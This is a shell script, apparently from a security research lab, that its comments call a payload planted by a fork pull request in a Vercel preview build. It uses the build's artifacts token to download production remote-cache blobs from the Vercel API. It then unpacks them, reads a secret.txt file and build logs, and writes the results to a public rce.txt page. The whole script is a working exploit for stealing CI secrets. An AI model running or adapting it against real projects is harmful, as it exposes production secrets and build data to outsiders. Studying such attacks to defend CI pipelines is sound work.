#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 15: the production cache blob is
# a zstd tar of the task's declared outputs. Extract it inside the fork-PR build
# and read what production put in it.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
EP="${VERCEL_API_ENDPOINT:-https://api.vercel.com}"
TEAM="${VERCEL_ARTIFACTS_OWNER:-}"
AT="${VERCEL_ARTIFACTS_TOKEN:-}"
{
  echo "== 0. what this build is =="
  echo "env=${VERCEL_ENV:-unset} deployment=${VERCEL_DEPLOYMENT_ID:-unset}"
  for key in 44fef76b3198d815 d53e15d029696e78; do
    echo
    echo "== artifact $key =="
    curl -s -m 8 -H "Authorization: Bearer $AT" "$EP/v8/artifacts/$key?teamId=$TEAM" -o "/tmp/$key.bin"
    ls -l "/tmp/$key.bin" | awk '{print "   fetched", $5, "bytes"}'
    rm -rf "/tmp/x-$key"; mkdir -p "/tmp/x-$key"
    zstd -dc "/tmp/$key.bin" 2>/dev/null | tar -C "/tmp/x-$key" -xf - 2>&1 | head -3
    echo "   files:"
    find "/tmp/x-$key" -type f | sed 's|/tmp/x-[^/]*||' | head -8
    echo "   out/secret.txt: $(cat "/tmp/x-$key/packages/vault/out/secret.txt" 2>&1 | head -2)"
    echo "   task log (first 3 lines):"
    head -3 "/tmp/x-$key/packages/vault/.turbo/turbo-build.log" 2>&1 | sed 's/^/     /'
  done
} > "$F" 2>&1
sleep 2
cat "$F"
